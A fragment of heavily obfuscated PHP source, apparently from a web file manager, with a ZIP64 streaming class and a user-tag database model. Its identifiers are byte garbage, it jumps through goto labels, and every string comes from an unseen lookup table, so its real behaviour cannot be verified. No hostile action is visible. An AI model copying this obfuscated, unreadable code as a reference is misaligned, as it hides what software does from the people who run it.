$CÂ«ÑÜíÀâ ? $CÂ«ÑÜíÀâ : $_FILES[$Bƒè›£ÕèØ[163]][$Bƒè›£ÕèØ[382]]; } $CÂ«ÑÜíÀâ = str_replace(array($Bƒè›£ÕèØ[93], $Bƒè›£ÕèØ[8]), array($Bƒè›£ÕèØ[8], $Bƒè›£ÕèØ[91]), trim($CÂ«ÑÜíÀâ)); if (!is_wap()) { return $CÂ«ÑÜíÀâ; } goto D≤÷∂±éä∞; D≤÷∂±éä∞: $e‰ıù˜ã≠Ë = strtotime($in[$Bƒè›£ÕèØ[1979]]); $e‰ıù˜ã≠Ë = $e‰ıù˜ã≠Ë ? $e‰ıù˜ã≠Ë : time(); $Aπ‘∂åª‰É = strtolower($CÂ«ÑÜíÀâ); goto fªâ∂Û≥ ‚; AùÑª≤à’: } private function errorInfo($b∂€–ÇË¯√) { $c¶ê∏ÔôΩÚ =& $_SERVER[¯èãÄπµ]; $cë¨ıÓÏπ = array($c¶ê∏ÔôΩÚ[1984], $c¶ê∏ÔôΩÚ[1985], $c¶ê∏ÔôΩÚ[1986], $c¶ê∏ÔôΩÚ[1987], $c¶ê∏ÔôΩÚ[1988], $c¶ê∏ÔôΩÚ[1989], $c¶ê∏ÔôΩÚ[1990], $c¶ê∏ÔôΩÚ[1991]); return $b∂€–ÇË¯√ . $c¶ê∏ÔôΩÚ[4] . $cë¨ıÓÏπ[$b∂€–ÇË¯√]; } } class ZipMake { const VERSION = "\x30\56\62\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($fó‚πîÚæ√ = null) { $e·Üî˜»ˆ  =& $_SERVER[¯èãÄπµ]; $this->outputStream = fopen($e·Üî˜»ˆ [1992], $e·Üî˜»ˆ [1222]); $this->outputName = $fó‚πîÚæ√; $this->needHeaders = !0; } public function addFile($DÜ‚ñ±°‰î, $fÜ¥·ƒ£»‚) { goto A§≤≥Ö”∏’; EüìÏ™´∑á: $bΩøæ£Ëº∫ = $this->addFileHeader($DÜ‚ñ±°‰î, $Fî™ÕÂﬂí–); $a°⁄õ∞ì∑ƒ = $bçöõ€‚Ÿñ = filesize($fÜ¥·ƒ£»‚); $Aã⁄•ÂªÈ = fopen($fÜ¥·ƒ£»‚, $f◊¬•éåå®[1993]); goto a°◊∑Ê™˘; A§≤≥Ö”∏’: $f◊¬•éåå® =& $_SERVER[¯èãÄπµ]; $DÜ‚ñ±°‰î = $this->filterFilename($DÜ‚ñ±°‰î); $Fî™ÕÂﬂí– = static::METHOD_STORE; goto EüìÏ™´∑á; a°◊∑Ê™˘: while (!feof($Aã⁄•ÂªÈ)) { $bí…ﬁ∏è— = fread($Aã⁄•ÂªÈ, 1048576); $this->send($bí…ﬁ∏è—); } fclose($Aã⁄•ÂªÈ); $cÛûë‘ö∆â = hexdec(hash_file($f◊¬•éåå®[1994], $fÜ¥·ƒ£»‚)); goto c÷œÖ•ÚÁª; c÷œÖ•ÚÁª: $this->addFileFooter($DÜ‚ñ±°‰î, $Fî™ÕÂﬂí–, $cÛûë‘ö∆â, $a°⁄õ∞ì∑ƒ, $bçöõ€‚Ÿñ, $bΩøæ£Ëº∫); goto F∫Í∑îÖ¨é; F∫Í∑îÖ¨é: } public function addFileFromStream($a¢’¶úêºü, $f≥»Ì‚ÊÖâ) { goto B°°‡Ûñé’; d«¬êÖ¥÷ˆ: fseek($f≥»Ì‚ÊÖâ, 0, SEEK_END); $B¢“ùŒ°™‹ = $BÍ‘ù§ú≈ì = ftell($f≥»Ì‚ÊÖâ); rewind($f≥»Ì‚ÊÖâ); goto Dò∏√èñüû; B°°‡Ûñé’: $a¢’¶úêºü = $this->filterFilename($a¢’¶úêºü); $cÚ€ëÚ∂Éã = static::METHOD_STORE; $eÊçÑ±¡‡„ = $this->addFileHeader($a¢’¶úêºü, $cÚ€ëÚ∂Éã); goto d«¬êÖ¥÷ˆ; cøóá…ñ®≥: $this->addFileFooter($a¢’¶úêºü, $cÚ€ëÚ∂Éã, $Däò“èÁ∏¨, $B¢“ùŒ°™‹, $BÍ‘ù§ú≈ì, $eÊçÑ±¡‡„); goto Cˆ˜˜ı’óç; Dò∏√èñüû: $A‚‰ ¢ﬂÍœ = hash_init($_SERVER[¯èãÄπµ][1994]); while (!feof($f≥»Ì‚ÊÖâ)) { $AáŒµå©Çª = fread($f≥»Ì‚ÊÖâ, 1048576); hash_update($A‚‰ ¢ﬂÍœ, $AáŒµå©Çª); $this->send($AáŒµå©Çª); } $Däò“èÁ∏¨ = hexdec(hash_final($A‚‰ ¢ﬂÍœ)); goto cøóá…ñ®≥; Cˆ˜˜ı’óç: } public function finish() { foreach ($this->files as $dËî°≈¥ıÉ) { $this->addCdrFile($dËî°≈¥ıÉ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($dËÙÌµŒ¨°, $Cú√—Ñ’ØΩ) { goto A√êÔ”ÌÁ; EÀﬁ™Î¯∫ÿ: $Dπ≠äÎ¨˜∑ = $this->packFields($cûÂë±Æí∏); $f˘ú€ÀË™” = $this->packFields($Bí©⁄Ì—œˆ); $this->send($Dπ≠äÎ¨˜∑ . $dËÙÌµŒ¨° . $f˘ú€ÀË™”); goto AÀÓàûè·Ó; CÇ»µﬂØƒ: $DÀøóÊá¡≈ = $this->dosTime(time()); $cûÂë±Æí∏ = array(array($D˘∞»î«ìï[1996], static::FILE_HEADER_SIGNATURE), array($D˘∞»î«ìï[1997], static::ZIP_VERSION_64), array($D˘∞»î«ìï[1997], 8), array($D˘∞»î«ìï[1997], $Cú√—Ñ’ØΩ), array($D˘∞»î«ìï[1996], $DÀøóÊá¡≈), array($D˘∞»î«ìï[1996], 0), array($D˘∞»î«ìï[1996], 4294967295), array($D˘∞»î«ìï[1996], 4294967295), array($D˘∞»î«ìï[1997], $AÀÛÁÇ∏·‚), array($D˘∞»î«ìï[1997], 32)); $Bí©⁄Ì—œˆ = array(array($D˘∞»î«ìï[1997], 1), array($D˘∞»î«ìï[1997], 28), array($D˘∞»î«ìï[1998], 0), array($D˘∞»î«ìï[1998], 0), array($D˘∞»î«ìï[1998], 0), array($D˘∞»î«ìï[1996], 0)); goto EÀﬁ™Î¯∫ÿ; AÀÓàûè·Ó: return strlen($Dπ≠äÎ¨˜∑) + $AÀÛÁÇ∏·‚ + strlen($f˘ú€ÀË™”); goto aöÏ”Çò›Æ; A√êÔ”ÌÁ: $D˘∞»î«ìï =& $_SERVER[¯èãÄπµ]; $dËÙÌµŒ¨° = preg_replace($D˘∞»î«ìï[1995], $D˘∞»î«ìï[33], $dËÙÌµŒ¨°); $AÀÛÁÇ∏·‚ = strlen($dËÙÌµŒ¨°); goto CÇ»µﬂØƒ; aöÏ”Çò›Æ: } protected function addFileFooter($E…º˘òäßö, $e˘Ï‡’πàÑ, $cÊËêÍÂÂ«, $b˜∫î…ƒ®√, $Aä≤ÌÒ‰ΩÜ, $C´¨ç⁄‰Ë‹) { $E’´ØÒΩƒ¯ =& $_SERVER[¯èãÄπµ]; $C≠Ú¡πÊøÁ = array(array($E’´ØÒΩƒ¯[1996], static::DATA_DESCRIPTOR_SIGNATURE), array($E’´ØÒΩƒ¯[1996], $cÊËêÍÂÂ«), array($E’´ØÒΩƒ¯[1998], $b˜∫î…ƒ®√), array($E’´ØÒΩƒ¯[1998], $Aä≤ÌÒ‰ΩÜ)); $BΩ€‹£˘¬¨ = $this->packFields($C≠Ú¡πÊøÁ); $this->send($BΩ€‹£˘¬¨); $DåÌÓØïùŸ = $C´¨ç⁄‰Ë‹ + $b˜∫î…ƒ®√ + $b›ﬂ‹¢∂ªö; $this->addToCdr($E…º˘òäßö, $e˘Ï‡’πàÑ, $cÊËêÍÂÂ«, $b˜∫î…ƒ®√, $Aä≤ÌÒ‰ΩÜ, $DåÌÓØïùŸ); } private function addToCdr($b≈Ñø§¢òá, $D∆ÏéË∫ªò, $Fú£üŒò»¨, $Eê‡”Ç¥ÈÓ, $Fé¥Íπâ˜ﬂ, $bæâ√éø‘›) { $this->files[] = array($b≈Ñø§¢òá, $D∆ÏéË∫ªò, $Fú£üŒò»¨, $Eê‡”Ç¥ÈÓ, $Fé¥Íπâ˜ﬂ, $this->ofs); $this->ofs += $bæâ√éø‘›; } protected function addCdrFile($FÑÊæ∏ÈÖ¿) { goto fË¢éÑâ≥ò; fË¢éÑâ≥ò: $dŸ∏éµ⁄æÚ =& $_SERVER[¯èãÄπµ]; list($Cààù°ÚõÒ, $Eæ√ßÃÌà∑, $b◊âÖÚﬂò, $e√®œàˆœˆ, $f¬®»ã∑õ∆, $D±¢»îÙ∆π) = $FÑÊæ∏ÈÖ¿; $DòÚå∂¬¯‡ = $dŸ∏éµ⁄æÚ[33]; goto büâ∆”ÖØç; a ó‹¢∑êá: $CËŸ√º·…ì = $this->packFields($b∑ﬁÈ¶ôó˘); $F’¥¶ÌÏó„ = $this->packFields($cîÌí‚÷Ôé); $Aû⁄Àóºì≥ = $CËŸ√º·…ì . $Cààù°ÚõÒ . $DòÚå∂¬¯‡ . $F’¥¶ÌÏó„; goto eëØù–•ôÚ; eëØù–•ôÚ: $this->send($Aû⁄Àóºì≥); $this->cdr_ofs += strlen($Aû⁄Àóºì≥); goto CÍÒéà…Œ’; büâ∆”ÖØç: $cåıüÑô°ä = $this->dosTime(time()); $b∑ﬁÈ¶ôó˘ = array(array($dŸ∏éµ⁄æÚ[1996], static::CDR_FILE_SIGNATURE), array($dŸ∏éµ⁄æÚ[1997], static::ZIP_VERSION_64), array($dŸ∏éµ⁄æÚ[1997], static::ZIP_VERSION_64), array($dŸ∏éµ⁄æÚ[1997], 8), array($dŸ∏éµ⁄æÚ[1997], $Eæ√ßÃÌà∑), array($dŸ∏éµ⁄æÚ[1996], $cåıüÑô°ä), array($dŸ∏éµ⁄æÚ[1996], $b◊âÖÚﬂò), array($dŸ∏éµ⁄æÚ[1996], 4294967295), array($dŸ∏éµ⁄æÚ[1996], 4294967295), array($dŸ∏éµ⁄æÚ[1997], strlen($Cààù°ÚõÒ)), array($dŸ∏éµ⁄æÚ[1997], 32), array($dŸ∏éµ⁄æÚ[1997], strlen($DòÚå∂¬¯‡)), array($dŸ∏éµ⁄æÚ[1997], 0), array($dŸ∏éµ⁄æÚ[1997], 0), array($dŸ∏éµ⁄æÚ[1996], 32), array($dŸ∏éµ⁄æÚ[1996], 4294967295)); $cîÌí‚÷Ôé = array(array($dŸ∏éµ⁄æÚ[1997], 1), array($dŸ∏éµ⁄æÚ[1997], 28), array($dŸ∏éµ⁄æÚ[1998], $f¬®»ã∑õ∆), array($dŸ∏éµ⁄æÚ[1998], $e√®œàˆœˆ), array($dŸ∏éµ⁄æÚ[1998], $D±¢»îÙ∆π), array($dŸ∏éµ⁄æÚ[1996], 0)); goto a ó‹¢∑êá; CÍÒéà…Œ’: } protected function addCdr64Eof() { goto AÍ†√„™”ø; c¿ËÖÍß≥´: $BØ€ñ¶—ôÕ = $this->ofs; $A˘†Ö™¶√ = array(array($CË∑Ü‚’ƒ§[1996], static::ZIP64_CDR_EOF_SIGNATURE), array($CË∑Ü‚’ƒ§[1998], 44), array($CË∑Ü‚’ƒ§[1997], static::ZIP_VERSION_64), array($CË∑Ü‚’ƒ§[1997], static::ZIP_VERSION_64), array($CË∑Ü‚’ƒ§[1996], 0), array($CË∑Ü‚’ƒ§[1996], 0), array($CË∑Ü‚’ƒ§[1998], $EèÌ à€–‰), array($CË∑Ü‚’ƒ§[1998], $EèÌ à€–‰), array($CË∑Ü‚’ƒ§[1998], $Cçë êÙﬂ∂), array($CË∑Ü‚’ƒ§[1998], $BØ€ñ¶—ôÕ)); $BÌÂÁá’•‡ = $this->packFields($A˘†Ö™¶√); goto FÌÌÇÖ•¶Ω; FÌÌÇÖ•¶Ω: $this->send($BÌÂÁá’•‡); goto c‚ªœê°©á; AÍ†√„™”ø: $CË∑Ü‚’ƒ§ =& $_SERVER[¯èãÄπµ]; $EèÌ à€–‰ = count($this->files); $Cçë êÙﬂ∂ = $this->cdr_ofs; goto c¿ËÖÍß≥´; c‚ªœê°©á: } protected function addCdr64Locator() { goto A¡é„Ã…·Ë; bÒ∆øˆäç¿: $DÉœÆÂ˜ûÆ = $this->ofs; $fŒ›åÀÖ›Ø = array(array($CÖÿ§îëõÿ[1996], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($CÖÿ§îëõÿ[1996], 0), array($CÖÿ§îëõÿ[1998], $DÉœÆÂ˜ûÆ + $CÎÈ‡ï†÷ú), array($CÖÿ§îëõÿ[1996], 1)); $b⁄´Ë‡ë®ó = $this->packFields($fŒ›åÀÖ›Ø); goto Dõˆ®ññı»; A¡é„Ã…·Ë: $CÖÿ§îëõÿ =& $_SERVER[¯èãÄπµ]; $døßÍâÆÚ€ = count($this->files); $CÎÈ‡ï†÷ú = $this->cdr_ofs; goto bÒ∆øˆäç¿; Dõˆ®ññı»: $this->send($b⁄´Ë‡ë®ó); goto eÙÈ∂√àÁö; eÙÈ∂√àÁö: } protected function addCdrEof() { goto A§©££€„’; C·ÊÈÙ™¬º: $bÉﬁ¿¡Û»¡ = $this->packFields($eØ∞ƒç»Ñ®) . $EœÊê÷êä›; $this->send($bÉﬁ¿¡Û»¡); goto EÒæõ÷¿ñ†; A§©££€„’: $cääèàÔ–ô =& $_SERVER[¯èãÄπµ]; $D«ûΩƒìŒã = count($this->files); $b©ıî·∏ ± = $this->cdr_ofs; goto E‡“íõ†–á; E‡“íõ†–á: $C∑ÃË√ﬁßØ = $this->ofs; $EœÊê÷êä› = $cääèàÔ–ô[33]; $eØ∞ƒç»Ñ® = array(array($cääèàÔ–ô[1996], static::CDR_EOF_SIGNATURE), array($cääèàÔ–ô[1997], 0), array($cääèàÔ–ô[1997], 0), array($cääèàÔ–ô[1997], $D«ûΩƒìŒã), array($cääèàÔ–ô[1997], $D«ûΩƒìŒã), array($cääèàÔ–ô[1996], 4294967295), array($cääèàÔ–ô[1996], 4294967295), array($cääèàÔ–ô[1997], strlen($EœÊê÷êä›))); goto C·ÊÈÙ™¬º; EÒæõ÷¿ñ†: } protected function addCdr() { foreach ($this->files as $bäïã†ÓÔí) { $this->addCdrFile($bäïã†ÓÔí); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $DÔ¬öã©Øâ =& $_SERVER[¯èãÄπµ]; $fÍôÎ™êæ¥ = $DÔ¬öã©Øâ[198]; if ($this->outputName) { $bøÙÒ±ÓﬂÎ = trim(str_replace(array($DÔ¬öã©Øâ[112], $DÔ¬öã©Øâ[55], $DÔ¬öã©Øâ[93], $DÔ¬öã©Øâ[67], $DÔ¬öã©Øâ[213], $DÔ¬öã©Øâ[994]), $DÔ¬öã©Øâ[33], $this->outputName)); $dÀ®ï¬ùíà = rawurlencode($bøÙÒ±ÓﬂÎ); $fÍôÎ™êæ¥ .= "\73\x20\146\x69\x6c\x65\x6e\x61\x6d\x65\52\x3d\165\x74\x66\x2d\x38\47\47{$dÀ®ï¬ùíà}"; } $e≈°ÃòÔ¢§ = array($DÔ¬öã©Øâ[195] => $DÔ¬öã©Øâ[1999], $DÔ¬öã©Øâ[2000] => $fÍôÎ™êæ¥, $DÔ¬öã©Øâ[2001] => $DÔ¬öã©Øâ[2002], $DÔ¬öã©Øâ[2003] => $DÔ¬öã©Øâ[2004], $DÔ¬öã©Øâ[2005] => $DÔ¬öã©Øâ[2006]); foreach ($e≈°ÃòÔ¢§ as $Béª‚≤ßçç => $dÌ™‰©À™Ù) { header($Béª‚≤ßçç . $DÔ¬öã©Øâ[884] . $dÌ™‰©À™Ù); } } protected function send($CêÀ∫Í§å”) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $CêÀ∫Í§å”); } protected final function dosTime($B©©‰Â§Ã∞) { $b›íÉèÎ√å =& $_SERVER[¯èãÄπµ]; $dæóÿ¶ç ï = getdate($B©©‰Â§Ã∞); if ($dæóÿ¶ç ï[$b›íÉèÎ√å[1709]] < 1980) { $dæóÿ¶ç ï = array($b›íÉèÎ√å[1709] => 1980, $b›íÉèÎ√å[2007] => 1, $b›íÉèÎ√å[2008] => 1, $b›íÉèÎ√å[2009] => 0, $b›íÉèÎ√å[2010] => 0, $b›íÉèÎ√å[2011] => 0); } $dæóÿ¶ç ï[$b›íÉèÎ√å[1709]] -= 1980; return $dæóÿ¶ç ï[$b›íÉèÎ√å[1709]] << 25 | $dæóÿ¶ç ï[$b›íÉèÎ√å[2007]] << 21 | $dæóÿ¶ç ï[$b›íÉèÎ√å[2008]] << 16 | $dæóÿ¶ç ï[$b›íÉèÎ√å[2009]] << 11 | $dæóÿ¶ç ï[$b›íÉèÎ√å[2010]] << 5 | $dæóÿ¶ç ï[$b›íÉèÎ√å[2011]] >> 1; } protected function packFields($béÀäŸ™ÉÜ) { $cö¡«⁄‡ìÏ =& $_SERVER[¯èãÄπµ]; $fô¬ïΩÂïÜ = $cö¡«⁄‡ìÏ[33]; $B∑ó·Á˘‡è = array(); foreach ($béÀäŸ™ÉÜ as $dπËœÂ˜ﬂ´) { $fô¬ïΩÂïÜ .= $dπËœÂ˜ﬂ´[0]; $B∑ó·Á˘‡è[] = $dπËœÂ˜ﬂ´[1]; } array_unshift($B∑ó·Á˘‡è, $fô¬ïΩÂïÜ); return call_user_func_array($cö¡«⁄‡ìÏ[2012], $B∑ó·Á˘‡è); } protected function filterFilename($CÍ»ªŸ…Ï©) { $Eú˜éÊ¢ Â =& $_SERVER[¯èãÄπµ]; return str_replace(array($Eú˜éÊ¢ Â[93], $Eú˜éÊ¢ Â[4], $Eú˜éÊ¢ Â[172], $Eú˜éÊ¢ Â[69], $Eú˜éÊ¢ Â[112], $Eú˜éÊ¢ Â[929], $Eú˜éÊ¢ Â[932], $Eú˜éÊ¢ Â[267]), $Eú˜éÊ¢ Â[70], $CÍ»ªŸ…Ï©); } } class ZipStream { } goto e≥ÇÃ«Ëß; EüÛûæÂﬁπ: define($_SERVER[¯èãÄπµ][1916], 2); define($_SERVER[¯èãÄπµ][1917], 3); define($_SERVER[¯èãÄπµ][1918], 4); goto BﬁÂÍΩâ¿•; BØÑ◊Õ∑∂‚: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($C¢œ¨Ì∂õŒ) { $Bã´™·‰±† =& $_SERVER[¯èãÄπµ]; return array($Bã´™·‰±†[2468] => array(USER_ID, $Bã´™·‰±†[2524])); } protected function listData() { $f‘¢≈∞Ë¿ı =& $_SERVER[¯èãÄπµ]; $aﬁ¢†∑Ûú£ = array($f‘¢≈∞Ë¿ı[1415] => USER_ID, $f‘¢≈∞Ë¿ı[432] => array($f‘¢≈∞Ë¿ı[2525], 0)); $A§ÑÆÃ©Ω„ = $f‘¢≈∞Ë¿ı[2526]; $a“”⁄Æç‚Ü = $f‘¢≈∞Ë¿ı[2527]; $fæÃó©îá› = $this->field($A§ÑÆÃ©Ω„)->where($aﬁ¢†∑Ûú£)->order($a“”⁄Æç‚Ü)->select(); return $fæÃó©îá› ? $fæÃó©îá› : array(); } protected function listByTag($bÂª’îâ’¯) { } protected function addToTag($bªå•—¥âè, $aê„‘É˘ƒÓ) { $Bûßõ€¢£õ =& $_SERVER[¯èãÄπµ]; if (!Model($Bûßõ€¢£õ[2295])->listData($aê„‘É˘ƒÓ) || !Model($Bûßõ€¢£õ[755])->pathInfo($bªå•—¥âè)) { return !1; } $D·ò˜ ÃÔë = array($Bûßõ€¢£õ[1415] => USER_ID, $Bûßõ€¢£õ[432] => $aê„‘É˘ƒÓ, $Bûßõ€¢£õ[383] => $bªå•—¥âè, $Bûßõ€¢£õ[384] => $Bûßõ€¢£õ[378], $Bûßõ€¢£õ[382] => $Bûßõ€¢£õ[33], $Bûßõ€¢£õ[2091] => 0); if ($this->where($D·ò˜ ÃÔë)->find()) { return !1; } return $this->add($D·ò˜ ÃÔë); } protected function removeFromTag($E„†Ôøê•÷, $b–µ´åüÚÛ) { $dﬂåØêÃ—Ñ =& $_SERVER[¯èãÄπµ]; if (!Model($dﬂåØêÃ—Ñ[2295])->listData($b–µ´åüÚÛ)) { return !1; } if (is_array($E„†Ôøê•÷)) { $E„†Ôøê•÷ = array($dﬂåØêÃ—Ñ[7], $E„†Ôøê•÷); } $BÖÓº“ãØÕ = array($dﬂåØêÃ—Ñ[1415] => USER_ID, $dﬂåØêÃ—Ñ[432] => $b–µ´åüÚÛ, $dﬂåØêÃ—Ñ[384] => $dﬂåØêÃ—Ñ[378], $dﬂåØêÃ—Ñ[383] => $E„†Ôøê•÷); return $this->where($BÖÓº“ãØÕ)->delete(); } protected function removeByTag($dîªá ’î∏) { $bÛÑÔ”Î∏ë =& $_SERVER[¯èãÄπµ]; if (!$dîªá ’î∏) { return !1; } $E€»ïîÇÇï = array($bÛÑÔ”Î∏ë[1415] => USER_ID, $bÛÑÔ”Î∏ë[432] => $dîªá ’î∏); return $this->where($E€»ïîÇÇï)->delete(); } protected function removeBySource($DÎÇﬂÎ÷ú) { $dΩ¨ò°≈âµ =& $_SERVER[¯èãÄπµ]; $b«Çøö‚¬‚ = array($dΩ¨ò°≈âµ[1415] => USER_ID, $dΩ¨ò°≈âµ[383] => $DÎÇﬂÎ÷ú, $dΩ¨ò°≈âµ[432] => array($dΩ¨ò°≈âµ[932], 0)); return $this->where($b«Çøö‚¬‚)->delete(); } }